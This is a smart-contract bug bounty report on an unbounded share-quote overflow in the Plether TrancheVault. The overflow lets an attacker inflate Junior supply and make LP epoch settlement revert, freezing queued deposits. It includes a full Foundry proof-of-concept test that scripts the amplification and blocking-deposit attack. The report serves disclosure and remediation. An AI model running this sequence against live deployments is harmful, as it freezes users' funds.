# \#100020 [SC-High] Unbounded share-quote overflow in TrancheVault.quoteDepositFromState reverts LP epoch settlement and freezes Junior deposits for 24+ hours

**Submitted on Nov 16th 2026 at 04:12:55 UTC by @SeerBear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100020
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
`TrancheVault.quoteDepositFromState` prices a Junior deposit as `assets * (supply + 1000) / (pricingAssets + 1)`, and HousePool defers pricing only when Junior principal is exactly 0. If a settlement lands when Junior principal is a few base units above zero while shares are still outstanding, one deposit multiplies Junior supply by about `assets / principal`. Repeating this takes supply to ~1e76. After that, one Junior deposit of ~1.2M USDG gets a quote larger than uint256, `Math.mulDiv` panics with `Panic(0x11)`, and every `settleLpEpoch` call reverts. Junior deposits queued behind it cannot be cancelled, so their USDG stays in vault escrow.

## Vulnerability Details
The quote has no bound on its result (`TrancheVault.sol:1409`):

```solidity
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

With fee 0, `denominator = pricingAssets + 1` (`TrancheVault.sol:1408`). OZ `Math.mulDiv` raises `Panic(0x11)` when the result does not fit (`lib/openzeppelin-contracts/contracts/utils/math/Math.sol:218`).

- `HousePool.sol:917`: Junior activation is deferred only when `pricingAssets == 0`, so 1 base unit of principal is enough for the deposit to be priced against the full outstanding supply.
- `HousePool.sol:1046`: `vault.quoteDepositFromState(...)` is called with no try/catch and no cap, so the zero-share reject path is never reached and the whole `settleLpEpoch` (`HousePool.sol:797`, via `OrderRouter.sol:479`) reverts. Redemption funding (`HousePool.sol:854`) runs in the same transaction and is rolled back with it.
- `TrancheVault.sol:850-859`: once its epoch is active, a Junior deposit can be cancelled only if it was rejected, Junior is terminally wiped, or Senior is impaired. Otherwise it reverts `TrancheVault__DepositEpochAlreadyActive`.
- How the near-wipe is reached: losses hit Junior first (`HousePoolWaterfallAccountingLib.sol:167`, `absorbLoss`), reconcile marks open trader PnL to market, and keepers are untrusted, so the keeper chooses which valid Pyth update it submits. The attacker trades against the pool; its Junior deposit loss returns as trading profit.

Known-issue check: `SECURITY.md` LP limitations (~1403-1422) cover rounding, dust and zero-payout epochs only. The contest by-design list (Cecuro MED-24/29) covers refund and redemption rounding. Prior audits checked (pre-audit, Cantina 0126, collaborative 2026-05-12, AI audit 2026-10-26, scan report): none reports this overflow. Cecuro MED-7 (caller may pick an older valid price) is only an input here; the bug is the unbounded quote.

Recommendation: before minting, check the quote and `supply + shares` against a safe cap (for example via `Math.tryMul` / an explicit bound). When the cap is exceeded, reject the epoch through the existing refund path (`finalizeDepositEpochFromPool(epochId, 0)`) instead of reverting. Also defer Junior activation, and allow cancellation, while Junior principal is below a minimum such as `MIN_TRANCHE_DEPOSIT_ASSETS` with supply outstanding.

## Impact Details
Selected impact: **Temporary freezing of funds for at least 24 hours.**

Short PoC, v2.0.0 release parameters:
- 17 legs (drain legs, then near-wipe cycles) take Junior supply from ~1e15 to ~1e76.
- Blocking deposit: 1,200,005 USDG.
- 24 of 24 hourly keeper `settleLpEpoch` attempts revert with `Panic(0x11)`.
- Victim's 10,000 USDG Junior deposit: cancel reverts `DepositEpochAlreadyActive`, the request is still pending, the victim has no refund, and the USDG is held by the Junior vault.
- Control: without amplification, the same deposit settles.

Because redemption funding shares the reverted transaction, Senior and Junior redemptions are also not funded while the freeze lasts (shown in the longer PoC, `PoC_E006_JuniorQuoteOverflow.t.sol`). The freeze lasts until Junior principal rises far enough that the quote fits again. Owner `pause()` lets redemptions clear but not deposits.

Caveats:
1. **Market-path dependent.** Under the release skew cap each leg is limited to ~1.5M tokens, so the run first needs 10 % basket moves to drain the 1.25M honest Junior, then near-wipe cycles each settled within about one price tick of the wipe level. In the PoC the keeper picks that price from a mocked range; on-chain it must be a real signed Pyth update.
2. Pyth and USDG are mocked, as in the repo's `BasePerpTest`.
3. The attacker is both trader and main Junior LP and carries directional risk, and it locks 1.2M USDG in escrow for the blocking deposit.
4. While the oracle is frozen (weekends), deposits are deferred by design (`HousePool.sol:908`) and settlement reverts for that reason instead, so the 24 h shown are market-open hours.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L850-L859
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L913-L920
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1040-L1050
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L165-L168


## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// E006: Junior supply amplification -> deposit-quote overflow -> settleLpEpoch frozen. Release economics ("economics"
// in deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json) set in setUp and the overrides.
// Public production flows only (OrderRouter V3 commit/execute/settleLpEpoch/updateMarkPrice, TrancheVault deposit/
// cancel). Mocked: Pyth (MockPyth) and USDG (mock mint), as in BasePerpTest. No vm.store/etch, no protocol pranks.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract PoC_E006_Short is BasePerpTest {

    address internal constant ATTACKER = address(0xA77A); // LP and trader (same party)
    address internal constant VICTIM = address(0xB1C7);
    address internal constant KEEPER = address(0x4EE9);
    uint256 internal constant MOVE = 0.1e8; // 10 % basket move per leg
    uint256 internal constant CYCLE_DEPOSIT = 100_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 10_000e6;
    uint256 internal constant MAX_LEG = 1_500_000e18; // stays under the release skew cap
    uint256 internal clientNonce;

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
            baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000); // maxSeniorExposureAssets, maxSeniorShareBps
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        (rc.minOpenNotionalAssets, rc.maxPendingOrders, rc.basketMaxConfidenceRatioBps) = (1000e6, 5, 10);
        (rc.adverseConfidenceMultiplierBps, rc.positionProtectionTriggerBountyAssets) = (2500, 200_000);
        _setRouterConfig(rc);
        uint256 monday = SETUP_TIMESTAMP; // timelocks moved the clock: resume on a Monday 10:00 UTC (normal trading)
        while (monday <= vm.getBlockTimestamp()) monday += 7 days;
        vm.warp(monday); // executionFeeBps 4 / settlementBufferBps 25 are already the CfdEngine defaults
    }

    function _deposit(address lp, TrancheVault vault, uint256 amount) internal returns (uint256 id) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
    }

    function _settle(uint256 price) internal {
        bytes[] memory d = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(d);
    }

    /// @dev Market order via production V3 `OrderRouter.commitOrder(OrderRequest)`; caller-side limits left open.
    function _trade(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 price) internal {
        (uint256 w, uint256 M) = (router.maxExecutionWindowSeconds(), type(uint256).max);
        OrderV3Types.ExecutionBounds memory bounds = OrderV3Types.ExecutionBounds(uint64(vm.getBlockTimestamp() + w),
            uint32(w), 7,
            IOrderLifecycleBook(router.lifecycleBook()).currentExecutionConfigHash(), M, M, M, M, M, M, 0, 0, type(uint32).max
        );
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest(bytes32(++clientNonce), side, size, margin,
            (side == CfdTypes.Side.LONG) == isClose ? M : 1, isClose, bounds); // unique client id; market target
        vm.prank(ATTACKER);
        uint64 id = OrderRouter(address(router)).commitOrder(req);
        bytes[] memory d = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrder(id, d);
    }

    function _seed() internal {
        bytes[] memory d = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.updateMarkPrice(d); // refresh mark after the config timelocks
        _deposit(address(0x1111), juniorVault, 1_250_000e6); // senior share cap 80 % -> junior first
        _settle(1e8);
        _deposit(address(0x5E5E), seniorVault, 5_000_000e6);
        _settle(1e8);
        settlementToken.mint(ATTACKER, 400_000e6);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(clearinghouse), 400_000e6);
        clearinghouse.deposit(ATTACKER, 400_000e6);
        vm.stopPrank();
    }

    /// @dev Junior principal left for pricing if settled at `price` (snapshot = eth_call dry run to pick the price).
    function _residual(uint256 price) internal returns (int256 r) {
        (uint256 t, uint256 b, uint256 snap) = (vm.getBlockTimestamp(), vm.getBlockNumber(), vm.snapshotState());
        bytes[] memory d = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        try router.settleLpEpoch(d) { r = int256(pool.juniorPrincipal()) - int256(CYCLE_DEPOSIT); }
        catch { r = type(int256).min; }
        vm.revertToState(snap);
        vm.warp(t); // restore the clock moved by the mock update
        vm.roll(b);
    }

    /// @dev Drain leg while junior exceeds one capped wipe; else near-wipe cycle with an attacker junior deposit.
    function _leg(uint256 k, uint256 price, int256 target) internal returns (uint256 next) {
        bool up = k % 2 == 0; // SHORT gains when the basket rises
        CfdTypes.Side side = up ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
        (, uint256 junior) = pool.getPendingDepositTrancheState();
        uint256 size = (junior * 1e20) / MOVE;
        bool drain = size > MAX_LEG;
        size = drain ? MAX_LEG : size - (size % CfdTypes.SIZE_QUANTUM) + CfdTypes.SIZE_QUANTUM;
        _trade(side, size, 40_000e6, false, price);
        if (drain) {
            next = up ? price + MOVE : price - MOVE;
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        } else {
            _deposit(ATTACKER, juniorVault, CYCLE_DEPOSIT);
            (uint256 lo, uint256 hi) = up ? (price, price + 2 * MOVE) : (price - 2 * MOVE, price);
            while (hi - lo > 1) { // residual(price) is monotone: find the last price with residual > target
                uint256 mid = (lo + hi) / 2;
                if (up == (_residual(mid) > target)) lo = mid;
                else hi = mid;
            }
            next = up ? lo : hi;
            _settle(next);
            assertGt(pool.juniorPrincipal(), CYCLE_DEPOSIT, "deposit priced, not deferred");
        }
        (uint256 open,,,,,,) = engine.positions(ATTACKER);
        _trade(side, open, 0, true, next);
    }

    function test_JuniorQuoteOverflowFreezesLpSettlement() public {
        _seed();
        (uint256 supplyStart, uint256 price, uint256 k) = (juniorVault.totalSupply(), 1e8, 0);
        uint256 cap = (uint256(1) << 254) / CYCLE_DEPOSIT;
        while (juniorVault.totalSupply() / 2e4 < cap) price = _leg(k++, price, 0); // ~x1e7 supply per cycle
        price = _leg(k++, price, int256(juniorVault.totalSupply() / cap + 1)); // land supply near 2^254
        uint256 supply = juniorVault.totalSupply();
        console2.log("legs; junior supply start / end (log10)", k, _log10(supplyStart), _log10(supply));
        // blocking deposit: assets * (supply + 1000) / (principal + 1) > 2^256 -> Math.mulDiv Panic(0x11)
        uint256 blockAssets = ((type(uint256).max / (supply + 1000)) * (pool.juniorPrincipal() + 1) + 1) * 3;
        _deposit(ATTACKER, juniorVault, blockAssets);
        vm.warp(vm.getBlockTimestamp() + 60);
        uint256 victimId = _deposit(VICTIM, juniorVault, VICTIM_DEPOSIT); // next epoch, behind the blocker
        console2.log("blocking deposit (USDG)", blockAssets / 1e6);
        uint256 h;
        for (; h < 24; ++h) { // hourly keeper settlement attempts (market open, live Pyth price) for 24 hours
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            bytes[] memory d = _mockPythUpdateData(price);
            vm.prank(KEEPER);
            vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
            router.settleLpEpoch(d);
        }
        console2.log("hours frozen; victim deposit stuck (USDG)", h, juniorVault.pendingDepositRequest(victimId, VICTIM) / 1e6);

        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimId);
        assertEq(juniorVault.pendingDepositRequest(victimId, VICTIM), VICTIM_DEPOSIT, "still pending");
        assertEq(settlementToken.balanceOf(VICTIM), 0, "not refunded");
        assertGe(settlementToken.balanceOf(address(juniorVault)), VICTIM_DEPOSIT, "USDG held in vault escrow");
    }

    function test_Control_SettlesWithoutAmplification() public {
        _seed();
        uint256 victimId = _deposit(VICTIM, juniorVault, VICTIM_DEPOSIT);
        _settle(1e8);
        assertEq(juniorVault.claimableDepositRequest(victimId, VICTIM), VICTIM_DEPOSIT, "victim deposit settles");
    }

    function _log10(uint256 x) internal pure returns (uint256 n) { while (x >= 10) (x, n) = (x / 10, n + 1); }

}
```
